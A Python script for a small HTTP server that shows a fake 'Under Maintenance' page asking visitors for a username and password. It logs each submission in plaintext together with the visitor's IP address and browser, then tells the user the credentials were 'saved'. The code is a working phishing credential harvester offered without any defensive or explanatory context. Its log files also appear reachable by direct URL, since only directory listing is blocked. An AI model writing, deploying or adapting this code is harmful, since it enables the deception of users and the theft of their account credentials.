import http.server
import socketserver
import datetime
import os

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            # Serve the maintenance page with the form
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = """
            <html>
            <head>
                <title>Under Maintenance</title>
            </head>
            <body>
                <h1>Under Maintenance</h1>
                <p>Please enter your credentials:</p>
                <form method="post">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username"><br>
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password"><br>
                    <input type="submit" value="Submit">
                </form>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        else:
            # Serve any other file requested
            http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path == "/":
            # Read the credentials from the form data
            content_length = int(self.headers.get("Content-Length"))
            post_data = self.rfile.read(content_length)
            username = ""
            password = ""
            for item in post_data.decode().split("&"):
                if item.startswith("username="):
                    username = item[9:]
                elif item.startswith("password="):
                    password = item[9:]

            # Get the IP and browser information from the headers
            ip_address = self.headers.get("X-Forwarded-For", self.client_address[0])
            browser = self.headers.get("User-Agent")

            # Write the credentials to the log file
            now = datetime.datetime.now()
            log_folder = os.path.join(os.path.dirname(__file__), "logs")
            os.makedirs(log_folder, exist_ok=True)
            log_file = os.path.join(log_folder, now.strftime("%Y-%m-%d"), "web-log.txt")
            os.makedirs(os.path.dirname(log_file), exist_ok=True)
            with open(log_file, "a") as f:
                f.write(f"{now.strftime('%Y-%m-%d %H:%M:%S')}, {username}, {password}, {ip_address}, {browser}\n")

            # Send a response to the user
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = """
            <html>
            <head>
                <title>Under Maintenance</title>
            </head>
            <body>
                <h1>Under Maintenance</h1>
                <p>Your credentials have been saved. Thank you!</p>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        else:
            # Serve any other file requested
            http.server.SimpleHTTPRequestHandler.do_GET(self)
    def list_directory(self, path):
        if self.path.startswith('/logs'):
            self.send_error(403, 'Forbidden')
            return None
        else:
            return http.server.SimpleHTTPRequestHandler.list_directory(self, path)

PORT = 8080

# Start the server
with socketserver.TCPServer(("", PORT), MyHttpRequestHandler) as httpd:
    print(f"Server listening on port {PORT}... Press Ctrl+C to stop.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

httpd.server_close()
print("Server stopped.")

